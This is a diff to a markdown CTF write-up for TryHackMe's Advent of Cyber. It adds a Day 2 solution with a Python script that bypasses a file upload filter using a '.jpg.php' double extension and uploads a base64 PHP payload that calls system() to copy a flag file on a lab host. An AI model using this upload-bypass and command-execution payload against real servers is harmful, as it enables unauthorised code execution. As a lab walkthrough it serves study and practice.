@@ -51,7 +51,9 @@ Jump to a Day:
 
 ## Day 1 ##
 
-#### Christmas Crisis - web exploitation
+### Christmas Crisis - web exploitation
+
+> Understand how the web works and take back control of the Christmas Command Centre!
 
 There will be lots of walkthroughs posted for these, I am sure like JohnHammonds [video](https://youtu.be/BJF84oWHmok), but here is my python code to automate the solves.
 
@@ -168,10 +170,86 @@ The Flag is THM{MjY0......M1NjBmZWFhYmQy}
 
 ## Day 2 ##
 
-- Web
-- The Elf Strikes Back
-- Learn about basic file upload filter bypasses by performing a security audit on the new security management server!
-- RCE
+### The Elf Strikes Back - web exploitation
+
+> Learn about basic file upload filter bypasses by performing a security audit on the new security management server!
+
+This one was a slight challenge to automate with the upload function being hidden in the obfuscated javascript. But, looking at the traffic, I was able to reproduce the `POST` request.
+
+![](../assets/images/adventofcyber/day2-site.png)
+
+Here are the highlights:
+
+- Access the site using the `id` parameter provided
+- Generate a random filename for the payload and double
+- Create a php payload to cp the `/var/www/flag.txt` file to the uploads directory with random name.
+- Generate base64 encoded string from the php payload
+- Craft POST data include payload and double file extension path
+- Access the php file the `/uploads` folder
+- Access the copy of the flag file in the uploads folder.
+ 
+
+```python
+#!/usr/bin/env python3
+
+import requests
+import os
+from base64 import b64encode
+from binascii import hexlify
+import time
+
+url = "http://10.10.242.121"
+
+s = requests.session()
+
+code = "ODIzODI5MTNiYmYw"
+params = {'id':code}
+
+r = s.get(url, params=params)
+
+fn = hexlify(os.urandom(8)).decode()
+
+payload = f"<?php system('cp /var/www/flag.txt /var/www/html/uploads/{fn}.txt');?>"
+payload = b64encode(payload.encode())
+
+data = f"""
+{{
+   "name":"{fn}.jpg.php",
+   "id":"ODIzODI5MTNiYmYw",
+   "mime":"application/x-php",
+   "body":"data:application/x-php;base64,{payload.decode()}"
+}}
+"""
+
+r = s.post(url+ '/upload',data=data)
+r = s.get(url + f'/uploads/{fn}.jpg.php')
+r = s.get(url + f'/uploads/{fn}.txt')
+
+print (r.text)
+```
+
+When you run the script you get the flag file with a message from [MuirlandOracle](https://twitter.com/MuirlandOracle) and the string to submit to the challenge site.
+
+```
+==============================================================
+
+
+You've reached the end of the Advent of Cyber, Day 2 -- hopefully you're enjoying yourself so far, and are learning lots! 
+This is all from me, so I'm going to take the chance to thank the awesome @Vargnaar for his invaluable design lessons, without which the theming of the past two websites simply would not be the same. 
+
+
+Have a flag -- you deserve it!
+THM{MGU3Y2U........TAxOWJhMzhh}
+
+
+Good luck on your mission (and maybe I'll see y'all again on Christmas Eve)!
+ --Muiri (@MuirlandOracle)
+
+
+==============================================================
+
+```
+
 
 ## Day 3 ##
 
